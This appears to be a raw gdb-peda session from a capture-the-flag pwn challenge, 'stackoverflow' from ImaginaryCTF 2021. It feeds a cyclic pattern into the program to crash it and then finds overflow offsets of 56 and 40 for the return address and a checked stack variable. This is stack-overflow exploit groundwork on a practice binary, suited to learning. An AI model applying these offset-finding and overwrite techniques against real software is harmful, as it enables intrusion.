gdb-peda$ run
Starting program: /home/mito/CTF/ImaginaryCTF_2021/Pwn_stackoverflow_50/stackoverflow 
Welcome to StackOverflow! Before you start ~~copypasting code~~ asking good questions, we would like you to answer a question. What's your favorite color?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G
Thanks! Now onto the posts!
ERROR: FEATURE NOT IMPLEMENTED YET

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af2224 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dcf8c0 --> 0x0 
RSI: 0x7ffff7dce7e3 --> 0xdcf8c0000000000a 
RDI: 0x1 
RBP: 0x4147414131414162 ('bAA1AAGA')
RSP: 0x7fffffffdd48 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
RIP: 0x555555554871 (<main+183>:	ret)
R8 : 0x22 ('"')
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x5555555546b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde20 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554866 <main+172>:	call   0x555555554660 <puts@plt>
   0x55555555486b <main+177>:	mov    eax,0x0
   0x555555554870 <main+182>:	leave  
=> 0x555555554871 <main+183>:	ret    
   0x555555554872:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x55555555487c:	nop    DWORD PTR [rax+0x0]
   0x555555554880 <__libc_csu_init>:	push   r15
   0x555555554882 <__libc_csu_init+2>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd48 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0008| 0x7fffffffdd50 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0016| 0x7fffffffdd58 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0024| 0x7fffffffdd60 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0032| 0x7fffffffdd68 ("AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0040| 0x7fffffffdd70 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0048| 0x7fffffffdd78 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0056| 0x7fffffffdd80 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555554871 in main ()
gdb-peda$ patto AcAA
AcAA found at offset: 56


[----------------------------------registers-----------------------------------]
RAX: 0x1c 
RBX: 0x0 
RCX: 0x7ffff7af2224 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7dcf8c0 --> 0x0 
RSI: 0x7ffff7dce7e3 --> 0xdcf8c0000000000a 
RDI: 0x1 
RBP: 0x7fffffffdd40 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
RSP: 0x7fffffffdd10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
RIP: 0x555555554836 (<main+124>:	cmp    QWORD PTR [rbp-0x8],0x69637466)
R8 : 0x1b 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x5555555546b0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffde20 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554825 <main+107>:	call   0x555555554690 <__isoc99_scanf@plt>
   0x55555555482a <main+112>:	lea    rdi,[rip+0x175]        # 0x5555555549a6
   0x555555554831 <main+119>:	call   0x555555554660 <puts@plt>
=> 0x555555554836 <main+124>:	cmp    QWORD PTR [rbp-0x8],0x69637466
   0x55555555483e <main+132>:	jne    0x55555555485f <main+165>
   0x555555554840 <main+134>:	lea    rdi,[rip+0x17b]        # 0x5555555549c2
   0x555555554847 <main+141>:	call   0x555555554660 <puts@plt>
   0x55555555484c <main+146>:	lea    rdi,[rip+0x185]        # 0x5555555549d8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd10 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
0008| 0x7fffffffdd18 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%s"...)
0016| 0x7fffffffdd20 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%"...)
0024| 0x7fffffffdd28 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A"...)
0032| 0x7fffffffdd30 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;"...)
0040| 0x7fffffffdd38 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...)
0048| 0x7fffffffdd40 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA"...)
0056| 0x7fffffffdd48 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000555555554836 in main ()
gdb-peda$ x/20s $rbp-8
0x7fffffffdd38:	"AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%"...
0x7fffffffde00:	"aA%0A%FA%bA%1A%G"
0x7fffffffde11:	"\336\377\377\377\177"
0x7fffffffde17:	""
0x7fffffffde18:	"\034"
0x7fffffffde1a:	""
0x7fffffffde1b:	""
0x7fffffffde1c:	""
0x7fffffffde1d:	""
0x7fffffffde1e:	""
0x7fffffffde1f:	""
0x7fffffffde20:	"\001"
0x7fffffffde22:	""
0x7fffffffde23:	""
0x7fffffffde24:	""
0x7fffffffde25:	""
0x7fffffffde26:	""
0x7fffffffde27:	""
0x7fffffffde28:	"e\341\377\377\377\177"
0x7fffffffde2f:	""
gdb-peda$ patto AA0A
AA0A found at offset: 40

